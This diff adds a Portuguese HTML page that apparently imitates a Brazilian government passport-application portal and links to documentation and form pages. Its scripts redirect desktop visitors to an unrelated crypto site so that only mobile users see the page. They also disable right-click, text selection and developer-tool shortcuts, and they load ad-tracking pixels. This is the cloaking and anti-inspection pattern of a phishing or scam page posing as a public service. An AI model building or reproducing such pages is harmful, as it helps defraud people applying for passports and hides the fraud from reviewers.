@@ -1,0 +1,334 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script async="" src="js/fbevents.js"></script><script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+          window.location.href = 'https://dogwifcoin.org/';
+        }
+     </script>
+     
+        <script type="text/javascript">
+        var message="Desculpe, o clique com o botão direito foi desativado.";
+        function clickIE() {if (document.all) {(message);return false;}}
+        function clickNS(e) {if
+        (document.layers||(document.getElementById&&!document.all)) {
+            if (e.which==2||e.which==3) {(message);return false;}}}
+        if (document.layers)
+        {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+        else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+        document.oncontextmenu=new Function("return false")
+        </script>
+        
+        <script>
+        document.onkeydown = function(e) {
+            if(event.keyCode == 123) {
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+                return false;
+            }
+        }
+        </script>
+        
+        <script>
+        function disableselect(e) {
+            return false;
+        }
+        
+        function reEnable() {
+            return true;
+        }
+        
+        document.onselectstart = new Function("return false");
+        
+        if (window.sidebar) {
+            document.onmousedown = disableselect;
+            document.onclick = reEnable;
+        }
+        </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Obter Passaporte</title>
+    <style>
+        /* Estilos básicos */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+        }
+
+        h1 {
+            font-size: 2.2em;
+            color: #003366;
+            padding-left: 20px;
+        }
+
+        .breadcrumb {
+            font-size: 0.9em;
+            margin: 20px;
+            padding-left: 20px;
+            display: flex;
+            align-items: center;
+            color: #666;
+        }
+
+        .breadcrumb a {
+            text-decoration: none;
+            color: #0050b3;
+            margin-right: 5px;
+        }
+
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+
+        .breadcrumb a span {
+            display: flex;
+            align-items: center;
+        }
+
+        .breadcrumb a span img {
+            margin-right: 5px;
+            width: 16px;
+            height: 16px;
+        }
+
+        .breadcrumb span.current {
+            color: #666;
+        }
+
+        /* Corrigindo o espaçamento entre os elementos da breadcrumb */
+        .breadcrumb a + a::before,
+        .breadcrumb span.current::before {
+            content: '>';
+            margin: 0 8px;
+            color: #666;
+        }
+
+        /* Linha de separação com sombra semelhante à segunda imagem */
+        .separator {
+            height: 2px;
+            background-color: #e0e0e0;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            margin-top: 10px;
+            margin-bottom: 20px;
+            border: none;
+        }
+
+        /* Linha simples abaixo de Olá */
+        .simple-separator {
+            width: 95%;
+            height: 2px;
+            background-color: #e0e0e0;
+            margin: 10px auto;
+        }
+
+        .content {
+            display: flex;
+            justify-content: space-between;
+            padding: 0 20px;
+        }
+
+        .steps {
+            flex: 1;
+            margin-right: 20px;
+        }
+
+        .steps ol {
+            list-style-type: none;
+            padding-left: 20px;
+        }
+
+        /* Numeração apenas para os dois primeiros tópicos */
+        .steps ol li:nth-child(1)::before {
+            content: "0";
+            font-weight: bold;
+            margin-right: 10px;
+            color: #A7A7A7;
+            font-size: 1.3em;
+        }
+
+        .steps ol li:nth-child(2)::before {
+            content: "1";
+            font-weight: bold;
+            margin-right: 10px;
+            color: #A7A7A7;
+            font-size: 1.3em;
+        }
+
+        /* Remover numeração dos demais tópicos */
+        .steps ol li:nth-child(n+3)::before {
+            content: "";
+            margin-right: 10px;
+        }
+
+        .steps ol li {
+            margin-bottom: 15px;
+            font-size: 1.25em;
+            color: #4A4A4A;
+        }
+
+        .steps ol li a {
+            text-decoration: none;
+            color: #0050b3;
+        }
+
+        .steps ol li a:hover {
+            text-decoration: underline;
+        }
+
+        .banner {
+            max-width: 300px;
+            text-align: center;
+        }
+
+        .banner img {
+            width: 100%;
+            height: auto;
+            border-radius: 0;
+        }
+
+        .icons-footer {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+            background-color: #f9f9f9;
+            padding: 20px 0;
+            border-top: 1px solid #ddd;
+        }
+
+        .icons-footer a {
+            margin: 0 20px;
+            text-decoration: none;
+            color: #003366;
+            text-align: center;
+        }
+
+        .icons-footer i {
+            font-size: 1.5em;
+            display: block;
+        }
+
+        .icons-footer span {
+            font-size: 1.1em;
+            margin-top: 5px;
+        }
+
+        /* Ajuste do rodapé no mobile */
+        @media (max-width: 768px) {
+            .content {
+                flex-direction: column;
+            }
+
+            .banner {
+                margin-top: 20px;
+            }
+
+            .icons-footer {
+                flex-direction: column;
+            }
+
+            .icons-footer a {
+                margin: 10px 0;
+            }
+        }
+    </style>
+    <script>
+        // Função para trocar o banner aleatoriamente a cada 8 segundos
+        function trocaBannerAleatoriamente() {
+            const banners = [
+                'https://imgur.com/4oZqs8U.png',
+                'https://imgur.com/MzkhTfT.png',
+                'https://imgur.com/MXcO0wT.png',
+                'https://imgur.com/dDLgp2g.png',
+            ];
+
+            function atualizarBanner() {
+                const bannerEscolhido = banners[Math.floor(Math.random() * banners.length)];
+                document.getElementById('banner-img').src = bannerEscolhido;
+            }
+
+            // Atualiza o banner imediatamente e depois a cada 8 segundos
+            atualizarBanner();
+            setInterval(atualizarBanner, 8000);
+        }
+
+        window.onload = trocaBannerAleatoriamente;
+    </script>
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1238265364044087');
+    fbq('track', 'PageView');
+    </script><script async="" defer="" src="js/pixel.js"></script></head>
+
+    <body><noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1238265364044087&ev=PageView&noscript=1"
+    /></noscript>
+    <script>
+        window.pixelId = "67243e70e257ad639df7c22c";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+
+
+
+    <!-- Caminho de navegação (breadcrumb) -->
+    <div class="breadcrumb">
+        <a href="#"><span>
+            <img src="images/casinha.svg" alt="Início">
+            Início</span></a>
+        <a href="#">Obter Passaporte</a>
+        <span class="current">Olá!</span>
+    </div>
+
+    <!-- Linha de separação com sombra -->
+    <div class="separator"></div>
+
+    <h1>Olá!</h1>
+
+    <!-- Linha simples abaixo de Olá -->
+    <div class="simple-separator"></div>
+
+    <p style="padding-left: 20px;">Uma etapa só deve ser iniciada <strong>depois</strong> da conclusão da etapa anterior. Caso tenha dúvidas antes ou durante a solicitação de passaporte, acesse o botão amarelo <span style="color: #f1c40f;">?</span> disponível no final da página.</p>
+
+    <div class="content">
+        <div class="steps">
+            <ol>
+                <li><a href="/passaporte/documentacao.html">Documentação necessária</a></li>
+                <li><a href="/passaporte/formulario.html">Preencher formulário</a></li>
+                
+            </ol>
+        </div>
+
+        <div class="banner">
+            <img id="banner-img" src="images/traficodepessoas7.png" alt="Banner de alerta migratório">
+            
+        </div>
+    </div>
+
+    <!-- Ícones do rodapé -->
+    <div class="icons-footer">
+        <a href="#"><i class="fas fa-question-circle"></i><span>Ajuda</span></a>
+        <a href="#"><i class="fas fa-print"></i><span>Imprimir</span></a>
+        <a href="#"><i class="fab fa-whatsapp"></i><span>Compartilhar</span></a>
+    </div>
+
+
+
+
+</body></html>
